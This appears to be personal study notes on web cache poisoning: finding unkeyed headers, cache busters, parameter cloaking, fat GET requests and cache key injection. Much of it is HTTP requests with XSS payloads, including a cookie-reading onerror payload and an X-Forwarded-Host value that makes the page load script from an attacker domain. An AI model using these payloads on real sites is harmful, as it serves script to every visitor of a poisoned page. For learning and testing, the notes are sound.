# Web cache poisoning
Attacker changes server's cache so harmful HTTP response is sent to all users.  
Server sets a "cache key" to some response and when request is repeated server returns the same cached response to all subsequent requests of all users.  
WCP is served together with other attacks.  
Firstly, we need to identify "unkeyed" inputs such as headers.  
For auto-detecting such inputs we can use Param miner and "guess headers" function  
After this we need to analyze how server serves unkeyed inputs. If we see that it reflected or used for generating data, it's entrypoint for WCP.  
After this we need to get the response cached.  
In short, websites are vulnerable to web cache poisoning if they handle unkeyed input in an unsafe way and allow the subsequent HTTP responses to be cached  
## Exploiting
Simply we can use WCP for XSS delivery  
```
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: innocent-website.co.uk

HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://innocent-website.co.uk/cms/social.png" />
```
Here, the value of the X-Forwarded-Host header is being used to dynamically generate an Open Graph image URL, which is then reflected in the response. Crucially for web cache poisoning, the X-Forwarded-Host header is often unkeyed. In this example, the cache can potentially be poisoned with a response containing a simple XSS payload: 
```
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"

HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://a."><script>alert(1)</script>"/cms/social.png" />
```
Some websites use unkeyed headers to dynamically generate URLs for importing resources, such as externally hosted JavaScript files. In this case, if an attacker changes the value of the appropriate header to a domain that they control, they could potentially manipulate the URL to point to their own malicious JavaScript file instead.  

If the response containing this malicious URL is cached, the attacker's JavaScript file would be imported and executed in the browser session of any user whose request has a matching cache key.   
```
GET / HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: evil-user.net
User-Agent: Mozilla/5.0 Firefox/57.0

HTTP/1.1 200 OK
<script src="https://evil-user.net/static/analytics.js"></script>
```
If we see that X-Forwarded-Host is served unkeyed and used in generating script src, we can use payload like `"></script><script>alert()</script>` to poison web cache and send this response to all users.  
## Cookie-handling vulns
One of example is cookies used to display some language:
```
GET /blog/post.php?mobile=1 HTTP/1.1
Host: innocent-website.com
User-Agent: Mozilla/5.0 Firefox/57.0
Cookie: language=pl;
Connection: close
```
If this response is cached, all next users will get polish version of site in their responses.  
This is a rare vector.  
## Multiple headers exploitation
For example if site forces HTTPS, it could use `Location` Header to redirect to itself via https request:
```
GET /random HTTP/1.1
Host: innocent-site.com
X-Forwarded-Proto: http

HTTP/1.1 301 moved permanently
Location: https://innocent-site.com/random
```
Here we can add `X-Forwarded-Host` header to force server to fetch js files from our exploit server

## Vary header
`Vary` header specifies a list of additional headers that should be treated as part of the cache key even if they are normally unkeyed  
It could be used with User-Agent header to specify target users (for example mobile users)  
If we see in response `Vary: User-Agent`, in WCP attack we can set user-agent header of our target victim  

## WCP for DOM explopitation
If website receives JSON and parses it to some DOM element (sink), we can exploit all DOM vulns via WCP  
Also it could be useful to use CORS so server woyuld accept JSON
So if we see that site uses some json from a server, we can add X-Forwarded-Host with another exploit server, add same location for a file and set some malicious XSS payload into jSON value:
```
{
"country": "<img src=1 onerror=alert(document.cookie) />"
}
```
And add CORS to script headers:
```
Access-Control-Allow-Origin: *
```

## Exploiting Cache Flaws
The first step is to identify a suitable "cache oracle" that you can use for testing. A cache oracle is simply a page or endpoint that provides feedback about the cache's behavior.  
Some sites use 3-party cache, for example in Akami-based websites we can detect cache-key using `Pragma: akami-x-get-cache-key` header:
```
GET /?param=1 HTTP/1.1
Host: innocent-website.com
Pragma: akamai-x-get-cache-key

HTTP/1.1 200 OK
X-Cache-Key: innocent-website.com/?param=1
```
Next we need to detect parameters that aren't sued in the key. For example, we can test port:
```
GET / HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com/en
Cache-Status: miss
```
Firstly, we see that site uses Host for Location to redirect users on localized page. Then we add port and check if it stays in cache:
```
GET / HTTP/1.1
Host: vulnerable-website.com:1337

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com:1337/en
Cache-Status: miss
```
And remove port:
```
GET / HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com:1337/en
Cache-Status: hit
```
This proves that port is excluded from cache key  
But `Host` header is cached, so we can only inject port, not change whole Host  
This could be potential DoS attack, but if site allows to inject non-numeric port, it could be escalated to XSS  
We can add cache-busters in order to observe page caching and not cache the main cache oracle. The mos common way is to add random parameter such as `&foo=bar`. But sometimes pages are dynamic and we can't use such cache busters. In such case we can use next variations:
```
Accept-Encoding: gzip, deflate, cachebuster
Accept: */*, text/cachebuster
Cookie: cachebuster=1
Origin: https://cachebuster.vulnerable-website.com
```
If you use Param Miner, you can also select the options "Add static/dynamic cache buster" and "Include cache busters in headers".  
Sometimes we can cache-bust a path  
```
Apache: GET //
Nginx: GET /%2F
PHP: GET /index.php/xyz
.NET GET /(A(xyz)/
```
These busters will redirect us to `/`, but could be unkeyed  
### Poisoning via unkeyed query string
```
/?evil='/><script>alert(1)</script>
```
## Unkeyed query params
Site could exclude onlyc ertain params that are used for debug or analytics/ads.  
One of candidates is `utm_content`

## Cache parameter cloaking
If cache excludes all parameters, it's possible to  remoove some parameters to detect logic flaws  
Sometimes we can replace `&` with `?` and any parameter will be proceeded like first
```
GET /?example=123?excluded_param=bad-stuff-here
```
In this case, the cache would identify two parameters and exclude the second one from the cache key. However, the server doesn't accept the second ? as a delimiter and instead only sees one parameter, example, whose value is the entire rest of the query string, including our payload. If the value of example is passed into a useful gadget, we have successfully injected our payload without affecting the cache key.  
Another way is to use `;` for Ruby-based apps:
```
GET /?keyed_param=abc&excluded_param=123;keyed_param=bad-stuff-here
```
Many caches will only interpret this as two parameters, delimited by the ampersand: 
```

    keyed_param=abc
    excluded_param=123;keyed_param=bad-stuff-here

```
But on back-end Ruby will interpret this as three different params, but two of them are duplicated. In such case Ruby accepts only the final parameter  
The end result is that the cache key contains an innocent, expected parameter value, allowing the cached response to be served as normal to other users. On the back-end, however, the same parameter has a completely different value, which is our injected payload. It is this second value that will be passed into the gadget and reflected in the poisoned response.  
For example we can control via additional parameters some name function in som js file and replace it with xss:
```
/js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
```
## Exploiting fat GET support
Sometimes we could be able to poison cache with POST request body  
But in some rare situations, server could allow GET requests with body that won't be cached:
```
GET /?param=innocent HTTP/1.1
…
param=bad-stuff-here
```
In this case, the cache key would be based on the request line, but the server-side value of the parameter would be taken from the body.  
```
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
....

callback=alert(1)
```
If site doesn't accept such fat requests, we can try to override it with "pseudo-post" request
```
X-HTTP-Method-Override: POST
```
## Normalized cache keys
Some caching implementations normalize keyed input when adding it to the cache key. In this case, both of the following requests would have the same key: 
```
GET /example?param="><test>
GET /example?param=%22%3e%3ctest%3e
```
This helps to bypass some restrictions for reflected xss, for example. URL-encoded xss in parameters is unexploitable, but cache poisoning could help to bypass this, because cahce would be served unencoded.  
## Cache key injection
If vulnerability is present in keyed header, we can try to exploit cache key injection with double underscores:
```
GET /path?param=123 HTTP/1.1
Origin: '-alert(1)-'__

HTTP/1.1 200 OK
X-Cache-Key: /path?param=123__Origin='-alert(1)-'__

<script>…'-alert(1)-'…</script>
```
Then we can induce victim to follow url
```
/path?param=123__Origin='-alert(1)-'__
```
Also another delimiters could be used, such as `$$`  
## Poisoning internal caches
